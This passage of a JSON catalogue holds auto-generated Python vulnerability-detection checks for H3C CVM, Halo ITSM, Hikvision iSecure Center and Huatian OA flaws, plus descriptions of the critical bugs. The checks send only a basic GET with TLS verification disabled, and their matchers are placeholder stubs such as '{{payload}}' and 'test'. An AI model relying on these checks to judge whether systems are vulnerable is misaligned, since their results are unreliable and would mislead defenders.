        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: h3c-cvm-arbitrary-file-upload\nName: H3C CVM - Arbitrary File Upload\nSeverity: critical\nDescription: An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_h3c_cvm_arbitrary_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"h3c-cvm-arbitrary-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"H3C CVM - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{payload}}' | mot(s) 'Content-Type: text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{payload}}', 'Content-Type: text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"H3C CVM - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_h3c_cvm_arbitrary_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "h3c",
          "lfi",
          "instrusive",
          "file-upload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_halo_tism_sqli",
        "name": "Halo ITSM - Pre-Authentication SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{rand_text_numeric(10)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: halo-tism-sqli\nName: Halo ITSM - Pre-Authentication SQL Injection\nSeverity: critical\nDescription: A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_halo_tism_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"halo-tism-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Halo ITSM - Pre-Authentication SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Halo ITSM - Pre-Authentication SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_halo_tism_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: halo-tism-sqli\nName: Halo ITSM - Pre-Authentication SQL Injection\nSeverity: critical\nDescription: A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_halo_tism_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"halo-tism-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"Halo ITSM - Pre-Authentication SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Halo ITSM - Pre-Authentication SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_halo_tism_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "halo",
          "itsm",
          "sqli",
          "time-based-sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_hikvision_isecure_center_rce",
        "name": "HIKVISION iSecure Center - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Hikvision's comprehensive security management platform has a Fastjson remote command execution vulnerability, which can execute system commands and obtain system permissions and sensitive data information of the target server.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'nt authority\\system, {\"code\"' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-isecure-center-rce\nName: HIKVISION iSecure Center - Remote Code Execution\nSeverity: critical\nDescription: Hikvision's comprehensive security management platform has a Fastjson remote command execution vulnerability, which can execute system commands and obtain system permissions and sensitive data information of the target server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_isecure_center_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-isecure-center-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"HIKVISION iSecure Center - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'nt authority\\\\system, {\"code\"\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['nt authority\\\\system, {\"code\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HIKVISION iSecure Center - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_isecure_center_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-isecure-center-rce\nName: HIKVISION iSecure Center - Remote Code Execution\nSeverity: critical\nDescription: Hikvision's comprehensive security management platform has a Fastjson remote command execution vulnerability, which can execute system commands and obtain system permissions and sensitive data information of the target server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_isecure_center_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-isecure-center-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"HIKVISION iSecure Center - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'nt authority\\\\system, {\"code\"\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['nt authority\\\\system, {\"code\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HIKVISION iSecure Center - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_isecure_center_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "hikvision",
          "isecure",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_huatian_oa8000_sqli",
        "name": "Huatian Power OA 8000 workFlowService - SQL injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(content_type, \"text/xml\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
